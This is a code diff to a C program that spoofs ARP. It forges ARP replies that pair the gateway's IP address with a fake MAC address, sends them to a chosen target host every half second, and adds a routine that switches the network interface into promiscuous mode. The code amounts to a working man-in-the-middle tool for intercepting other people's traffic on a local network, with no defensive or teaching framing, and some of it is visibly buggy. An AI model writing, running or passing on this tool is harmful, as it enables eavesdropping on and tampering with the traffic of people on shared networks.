@@ -55,7 +55,6 @@ struct treat_info treat_in;
 	    (((type)== TREAT_TYPE_DIRECT_OTHER) ? "Direct to Others!": "UnKown Type!")))
 
 void dump_treat_info(struct treat_info* op);
-int test_get_mac_from_ip(struct ip_addr* ipaddr);
 
 int init_treat_info(struct treat_info * treat_in,struct ether_info* ether_in,struct in_addr* ip,int type,struct mac_addr* fake_mac)
 {
@@ -138,21 +137,19 @@ void* arp_thread(void* args)
 	op_ether = op_treat->ether_in;
 
 	retval = build_arp_pkg(&arp_response,OP_ARP_RESPONSE);
-	memcpy(arp_response.targ_hw_addr,op_treat->treat_real_mac.mac,ETH_HW_ADDR_LEN);
-	memcpy(arp_response.src_hw_addr, op_treat->treat_fake_mac.mac,ETH_HW_ADDR_LEN);
+	memcpy(arp_response.targ_hw_addr,&op_treat->treat_real_mac,ETH_HW_ADDR_LEN);
+	memcpy(arp_response.src_hw_addr, &op_treat->treat_fake_mac,ETH_HW_ADDR_LEN);
 	memcpy(arp_response.sndr_ip_addr,&op_ether->gatewayIp.s_addr,IP_ADDR_LEN);
-	memcpy(arp_response.sndr_hw_addr,op_treat->treat_fake_mac.mac,ETH_HW_ADDR_LEN);
+	memcpy(arp_response.sndr_hw_addr,&op_treat->treat_fake_mac,ETH_HW_ADDR_LEN);
 	memcpy(arp_response.rcpt_ip_addr,&op_treat->treat_ip.s_addr,IP_ADDR_LEN);
-	memcpy(arp_response.rcpt_hw_addr,op_treat->treat_real_mac.mac,ETH_HW_ADDR_LEN);
+	memcpy(arp_response.rcpt_hw_addr,&op_treat->treat_real_mac,ETH_HW_ADDR_LEN);
 
 	sock = create_arp_sock();
 	if(sock<0){
 		error("create arp socket error!!\n");
 		return NULL;
 	}
-	/* two seconds send one ARP. */
-	time.tv_sec = 3;
-	time.tv_usec = 0;
+
 	FD_ZERO(&fds);
 	FD_SET(sock,&fds);
 
@@ -161,7 +158,11 @@ void* arp_thread(void* args)
 #endif
 
 	while(1){
-		retval = select(sock+1,&fds,NULL,NULL,&time);
+		/* two seconds send one ARP. */
+		time.tv_sec = 0;
+		time.tv_usec = 500000;
+		retval = select(1,&fds,NULL,NULL,&time);
+
 		if(retval==-1){
 			error("Select Error: %d\n",errno);
 			continue;
@@ -170,6 +171,7 @@ void* arp_thread(void* args)
 				trace("Receive Package on ARP sock!!\n");
 				len = read(sock,buffer,sizeof(buffer));
 				arp_rev_op = (struct arp_package*)buffer;
+				send_arp(sock,&arp_response,DEFAULT_DEVICE);
 				dump_arp(arp_rev_op);
 			}else{
 				error("What is it??\n");
@@ -212,6 +214,32 @@ void dump_treat_info(struct treat_info* op_treat)
 		   op_treat->treat_type,TREAT_TYPE_TO_STR(op_treat->treat_type));
 }
 
+int do_promisc(char* devName,int on_off)
+{
+	int sock, res;
+	struct ifreq ifr;
+
+	if ((sock = socket(AF_INET,SOCK_PACKET,htons(ETH_P_IP)))==0){
+		return -1;
+	}
+	strcpy(ifr.ifr_name, devName);
+
+	if ((res = ioctl(sock, SIOCGIFFLAGS, &ifr))!=0) {
+		close(sock);
+		return-1;
+	}
+
+	if(on_off)
+		ifr.ifr_flags |= IFF_PROMISC;
+	else
+		ifr.ifr_flags &= (~IFF_PROMISC);
+
+	if ((res = ioctl(sock, SIOCSIFFLAGS, &ifr)) != 0){
+		return -1;
+	}
+	return 0;
+}
+
 int main(int argc,char* argv[])
 {
 	int res;
@@ -221,6 +249,7 @@ int main(int argc,char* argv[])
 	inet_aton(argv[1], &gtIp);
 	inet_aton(argv[2], &treat_ip);
 
+	//do_promisc(DEFAULT_DEVICE,1);
 	res = init_ether_info(&ethr_in,&gtIp);
 	if(res!=0){
 		error("init_ether_info failed!!\n");
